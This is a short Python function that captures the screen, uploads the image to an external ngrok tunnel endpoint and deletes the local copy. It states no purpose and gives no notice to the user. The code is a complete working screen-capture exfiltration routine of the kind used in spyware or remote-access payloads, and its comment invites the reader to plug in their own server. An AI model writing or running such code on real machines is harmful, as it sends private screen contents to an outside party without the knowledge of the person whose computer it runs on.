def run():
    import pyautogui
    import requests
    import os

    # Take screenshot and save to temp file
    filename = "screenshot.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

    # Upload the screenshot to your server
    url = "https://tender-mutual-mastodon.ngrok-free.app/upload"  # <-- Replace with your real endpoint!
    try:
        with open(filename, "rb") as f:
            files = {'file': (filename, f, 'image/png')}
            response = requests.post(url, files=files, timeout=10)
        print(f"Screenshot uploaded, server responded: {response.status_code} {response.text}")
    except Exception as e:
        print(f"Failed to upload screenshot: {e}")

    # Optionally, delete the local file
    try:
        os.remove(filename)
    except:
        pass
